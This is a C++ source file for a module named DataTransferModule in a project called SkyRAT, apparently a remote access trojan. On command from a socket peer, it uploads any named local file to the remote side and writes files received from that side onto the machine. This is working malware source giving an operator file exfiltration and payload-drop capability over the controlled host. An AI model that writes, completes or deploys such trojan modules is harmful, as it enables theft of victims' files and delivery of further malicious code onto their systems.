#include "DataTransferModule.h"
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>

namespace fs = std::filesystem;

namespace SkyRAT {
namespace Modules {
namespace Implementations {

DataTransferModule::DataTransferModule()
    : m_isRunning(false), m_shouldStop(false)
    , m_isTransferring(false), m_logger(std::make_shared<Utils::Logger>())
    , m_socket(INVALID_SOCKET)
    , m_logFileName("data_transfer.log")
{
    m_transferStatus = "Initialized";
}
DataTransferModule::~DataTransferModule() {
    shutdown();
}

std::string DataTransferModule::getName() const {
    return "DataTransferModule";
}

std::string DataTransferModule::getVersion() const {
    return "1.0.0";
}

bool DataTransferModule::initialize() {
    if (!m_logger->initialize(m_logFileName)) {
        m_lastError = "Logger init failed";
        return false;
    }
    m_logger->info("DataTransferModule initialized");
    return true;
}

void DataTransferModule::shutdown() {
    m_shouldStop = true;
    if (m_isRunning) {
        stop();
    }
    m_logger->info("DataTransferModule shut down");
}

bool DataTransferModule::isRunning() const {
    return m_isRunning.load();
}

bool DataTransferModule::start(SOCKET socket) {
    if (m_isRunning) {
        m_logger->warning("Transfer already running");
        return false;
    }
    m_socket = socket;
    m_shouldStop = false;
    try {
        m_transferThread = std::make_unique<std::thread>(&DataTransferModule::transferThreadFunction, this);
        m_isRunning = true;
        m_logger->info("DataTransferModule started");
        return true;
    } catch (const std::exception& e) {
        m_logger->error("Failed to start transfer thread: " + std::string(e.what()));
        m_isRunning = false;
        return false;
    }
}

bool DataTransferModule::stop() {
    if (!m_isRunning) return true;

    m_shouldStop = true;
    if (m_transferThread && m_transferThread->joinable())
        m_transferThread->join();

    m_isRunning = false;
    m_logger->info("DataTransferModule stopped");
    return true;
}

bool DataTransferModule::processCommand(const std::string& command, SOCKET socket) {
    if (command == "START_TRANSFER") {
        return start(socket);
    } else if (command == "STOP_TRANSFER") {
        return stop();
    }
    return false;
}

std::string DataTransferModule::getStatus() const {
    return m_transferStatus;
}

bool DataTransferModule::canHandleCommand(const std::string& cmd) const {
    return (cmd == "START_TRANSFER" || cmd == "STOP_TRANSFER" ||
            cmd == "UPLOAD_FILE" || cmd == "DOWNLOAD_FILE");
}

bool DataTransferModule::executeCommand(const std::string& cmd, const std::vector<std::string>& args, SOCKET socket) {
    if (cmd == "UPLOAD_FILE" && !args.empty())
        return uploadFile(args[0]);
    else if (cmd == "DOWNLOAD_FILE" && !args.empty())
        return downloadFile(args[0]);
    else
        return processCommand(cmd, socket);
}

std::vector<std::string> DataTransferModule::getSupportedCommands() const {
    return { "START_TRANSFER", "STOP_TRANSFER", "UPLOAD_FILE", "DOWNLOAD_FILE" };
}

//
// Thread function for managing transfers
//
void DataTransferModule::transferThreadFunction() {
    m_transferStatus = "Ready";
    m_logger->info("Transfer thread running.");

    // Example: Could be extended to process upload/download jobs from a queue
    // For now, it just waits for stop
    while (!m_shouldStop) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    m_transferStatus = "Stopped";
    m_logger->info("Transfer thread exiting.");
}

void DataTransferModule::setProgressCallback(std::function<void(int,long long,long long)> callback) {
    std::lock_guard<std::mutex> lock(m_callbackMutex);
    m_progressCallback = callback;
}

void DataTransferModule::notifyProgress(int percent, long long transferred, long long total) {
    std::lock_guard<std::mutex> lock(m_callbackMutex);
    if (m_progressCallback) m_progressCallback(percent, transferred, total);
}

std::string DataTransferModule::sanitizeFileName(const std::string& fileName) {
    std::string safe = fileName;
    for (auto& c : safe) { if (c == '/' || c == '\\') c = '_'; }
    return safe;
}


// ------------------------------------
// UPLOAD
// ------------------------------------
bool DataTransferModule::uploadFile(const std::string& localPath, const std::string& remoteName) {
    if (m_isTransferring.load()) {
        m_logger->warning("Transfer in progress.");
        m_lastError = "Transfer in progress.";
        return false;
    }
    if (m_socket == INVALID_SOCKET) {
        m_logger->error("Invalid socket for upload.");
        m_lastError = "Invalid socket";
        return false;
    }

    fs::path lpath(localPath);
    if (!fs::exists(lpath) || fs::is_directory(lpath)) {
        m_logger->error("File doesn't exist or is directory: " + localPath);
        m_lastError = "Invalid local file";
        return false;
    }
    long long fsize = fs::file_size(lpath);
    std::string fname = remoteName.empty() ? lpath.filename().string() : remoteName;

    std::ifstream file(localPath, std::ios::binary);
    if (!file.is_open()) {
        m_logger->error("Failed to open: " + localPath);
        m_lastError = "Cannot open file";
        return false;
    }

    // Send header: UPLOAD:name:size
    std::ostringstream oss;
    oss << "UPLOAD:" << fname << ":" << fsize;
    std::string hdr = oss.str();
    if (!sendAll(hdr.c_str(), hdr.size())) {
        m_logger->error("Header send failed");
        file.close();
        m_lastError = "Header send failed";
        return false;
    }

    char ack[16] = { 0 };
    if (recv(m_socket, ack, 5, 0) != 5 || strncmp(ack, "READY", 5) != 0) {
        m_logger->error("No READY from server");
        file.close();
        m_lastError = "No READY from server";
        return false;
    }

    // Transfer file
    m_isTransferring = true;
    const size_t BUFSZ = 8192;
    char buf[BUFSZ];
    long long sent = 0;
    while (sent < fsize) {
        file.read(buf, BUFSZ);
        std::streamsize bytesRead = file.gcount();
        if (bytesRead <= 0) break;
        if (!sendAll(buf, bytesRead)) {
            m_logger->error("Failed to send file block.");
            break;
        }
        sent += bytesRead;
        int percent = static_cast<int>((sent * 100) / fsize);
        notifyProgress(percent, sent, fsize);
    }

    file.close();
    m_isTransferring = false;

    // Check success
    char resp[256] = { 0 };
    int rlen = recv(m_socket, resp, sizeof(resp)-1, 0);
    bool ok = (rlen > 0) && (std::string(resp).find("SUCCESS:") == 0);
    m_logger->info(ok ? "Upload completed." : "Upload failed: "+std::string(resp));
    notifyProgress(ok ? 100 : 0, sent, fsize);
    return ok;
}

// ------------------------------------
// DOWNLOAD
// ------------------------------------

bool DataTransferModule::downloadFile(const std::string& remoteName, const std::string& localPath) {
    if (m_isTransferring.load()) {
        m_logger->warning("Transfer in progress.");
        m_lastError = "Transfer in progress.";
        return false;
    }
    if (m_socket == INVALID_SOCKET) {
        m_logger->error("Invalid socket for download.");
        m_lastError = "Invalid socket";
        return false;
    }

    std::string localFile = localPath.empty() ? ("downloaded_" + sanitizeFileName(remoteName)) : localPath;

    std::string hdr = "DOWNLOAD:" + remoteName;
    if (!sendAll(hdr.c_str(), hdr.size())) {
        m_logger->error("Download header send failed");
        m_lastError = "Header send failed";
        return false;
    }

    char rbuf[1024] = { 0 };
    int rget = recv(m_socket, rbuf, sizeof(rbuf)-1, 0);
    std::string resp(rbuf, rget > 0 ? rget : 0);
    if (resp.find("DOWNLOAD:") != 0) {
        m_logger->error("Invalid response: " + resp);
        m_lastError = "Server response not DOWNLOAD";
        return false;
    }
    size_t pos = resp.find(":");
    long long fsize = 0;
    try { fsize = std::stoll(resp.substr(pos+1)); }
    catch (...) {
        m_logger->error("Invalid file size in header.");
        m_lastError = "Invalid size";
        return false;
    }
    if (fsize <= 0) {
        m_logger->error("File size is zero or negative.");
        m_lastError = "Zero/neg file size";
        return false;
    }

    std::ofstream file(localFile, std::ios::binary);
    if (!file.is_open()) {
        m_logger->error("Cannot create: " + localFile);
        m_lastError = "Local file open failed";
        return false;
    }

    const size_t BUFSZ = 8192;
    char buf[BUFSZ];
    long long recvd = 0;
    m_isTransferring = true;
    while (recvd < fsize) {
        int want = static_cast<int>(std::min((long long)BUFSZ, fsize - recvd));
        int got = recv(m_socket, buf, want, 0);
        if (got <= 0) {
            m_logger->error("recv() failed, got: " + std::to_string(got));
            break;
        }
        file.write(buf, got);
        recvd += got;
        int percent = static_cast<int>((recvd * 100) / fsize);
        notifyProgress(percent, recvd, fsize);
    }
    file.close();
    m_isTransferring = false;

    // Success?
    bool ok = (recvd == fsize);
    m_logger->info(ok ? ("Download success: " + localFile)
                      : ("Download failed: " + std::to_string(recvd) + " of " + std::to_string(fsize)));
    notifyProgress(ok ? 100 : 0, recvd, fsize);
    return ok;
}

//
// Socket helpers
//
bool DataTransferModule::sendAll(const char* data, size_t length) {
    size_t sent = 0;
    while (sent < length) {
        int n = send(m_socket, data + sent, static_cast<int>(length - sent), 0);
        if (n == SOCKET_ERROR || n == 0)
            return false;
        sent += n;
    }
    return true;
}
bool DataTransferModule::recvAll(char* buffer, size_t length) {
    size_t recvd = 0;
    while (recvd < length) {
        int n = recv(m_socket, buffer + recvd, static_cast<int>(length - recvd), 0);
        if (n <= 0)
            return false;
        recvd += n;
    }
    return true;
}

} // Implementations
} // Modules
} // SkyRAT
